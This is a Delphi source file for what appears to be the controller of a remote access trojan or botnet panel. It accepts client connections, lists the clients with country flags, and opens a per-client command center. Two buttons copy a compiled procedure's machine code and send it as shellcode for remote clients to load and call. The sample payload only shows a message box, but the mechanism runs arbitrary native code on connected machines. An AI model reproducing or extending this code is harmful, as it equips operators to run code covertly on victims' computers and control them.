unit Unit1;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, Vcl.ExtCtrls, Vcl.ComCtrls,
  System.Win.ScktComp, untClientObject, untCommands, untUtils, untControl,
  System.ImageList, Vcl.ImgList, Vcl.Menus;

type
  TForm1 = class(TForm)
    ListView1: TListView;
    Panel1: TPanel;
    Button1: TButton;
    ServerSocket1: TServerSocket;
    Button2: TButton;
    Button3: TButton;
    ilFlags: TImageList;
    PopupMenu1: TPopupMenu;
    OpenCommandcenter1: TMenuItem;
    procedure ServerSocket1ClientConnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure Button1Click(Sender: TObject);
    procedure ServerSocket1ClientDisconnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure ServerSocket1ClientError(Sender: TObject;
      Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
      var ErrorCode: Integer);
    procedure ServerSocket1ClientRead(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure ServerSocket1Listen(Sender: TObject; Socket: TCustomWinSocket);
    procedure Button2Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure ListView1DblClick(Sender: TObject);
  private
    { Private-Deklarationen }
  public
    { Public-Deklarationen }
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}

procedure lol(pConn:PConnRec; pData:Pointer; dwLen:Cardinal);
begin
  pConn.pAPI.xMessageBoxW(0, pData, nil,0);
end;
procedure lol_end();begin end;

procedure TForm1.Button1Click(Sender: TObject);
begin
  ServerSocket1.Active := True;
end;

procedure TForm1.Button2Click(Sender: TObject);
var
  tempThread:TClientThread;
  dwProcLen:Cardinal;
  pShell:PShellCode;
begin
  if listview1.Selected <> nil then
  begin
    tempThread := TClientThread(listview1.Selected.SubItems.Objects[0]);
    dwProcLen := DWORD(@lol_end) - DWORD(@lol);
    GetMem(pShell, dwProcLen + SizeOf(TShellCode));
    if pShell <> nil then
    begin
      pShell.dwLen := dwProcLen;
      pShell.dwID := 1;
      CopyMemory(Pointer(DWORD(pShell) + SizeOf(TShellCode) - SizeOf(Pointer)), @lol, pShell.dwLen);
      tempThread.SendBuffer(CMD_SHELLCODE_NEW,pShell,dwProcLen + SizeOf(TShellCode) - SizeOf(Pointer));
      FreeMem(pShell);
    end;
  end;
end;

procedure TForm1.Button3Click(Sender: TObject);
var
  tempThread:TClientThread;
  dwProcLen:Cardinal;
  pShell:PShellCode;
  pe:String;
begin
  if listview1.Selected <> nil then
  begin
    pe := 'lel';
    tempThread := TClientThread(listview1.Selected.SubItems.Objects[0]);
    dwProcLen := (Length(pe)) * 2;
    GetMem(pShell, dwProcLen + SizeOf(TShellCode));
    if pShell <> nil then
    begin
      pShell.dwLen := dwProcLen;
      pShell.dwID := 1;
      CopyMemory(Pointer(DWORD(pShell) + SizeOf(TShellCode) - SizeOf(Pointer)), @pe[1], pShell.dwLen);
      tempThread.SendBuffer(CMD_SHELLCODE_CALL,pShell,dwProcLen + SizeOf(TShellCode) - SizeOf(Pointer));
      FreeMem(pShell);
    end;
  end;
end;

procedure TForm1.ListView1DblClick(Sender: TObject);
var
  tempThread:TClientThread;
  tempFormControl:TForm3;
begin
  if listview1.Selected <> nil then
  begin
    tempThread := TClientThread(listview1.Selected.SubItems.Objects[0]);
    if Assigned(tempthread.frmControl) = false then
    begin
      tempFormControl := TForm3.Create(nil);
      tempFormControl.InitializeForm(tempThread);
      tempThread.frmControl := tempFormControl;
    end;
    TForm3(tempThread.frmControl).Show;
  end;
end;

procedure TForm1.ServerSocket1ClientConnect(Sender: TObject;
  Socket: TCustomWinSocket);
var
  ClientThread:TClientThread;
Begin
  ClientThread := TClientThread.Create(True);
  ClientThread.mySocket := Socket;
  Socket.Data := ClientThread;
  ClientThread.RequestInformation();
end;

procedure TForm1.ServerSocket1ClientDisconnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
  TClientThread(Socket.Data).CleanUp;
  TClientThread(Socket.Data).Free;
end;

procedure TForm1.ServerSocket1ClientError(Sender: TObject;
  Socket: TCustomWinSocket; ErrorEvent: TErrorEvent; var ErrorCode: Integer);
begin
  if ErrorCode = 10053 then
    Socket.Close;
  ErrorCode := 0;
end;

procedure TForm1.ServerSocket1ClientRead(Sender: TObject;
  Socket: TCustomWinSocket);
var
  data:AnsiString;
begin
  Data := Socket.ReceiveText;
  if Data = '' then Exit;
  TClientThread(Socket.Data).Data := TClientThread(Socket.Data).Data + Data;
  TClientThread(Socket.Data).ReadData;
end;

procedure TForm1.ServerSocket1Listen(Sender: TObject; Socket: TCustomWinSocket);
begin
  Form1.Caption := 'Listening on Port: ' + IntToStr(ServerSocket1.Port);
end;

end.
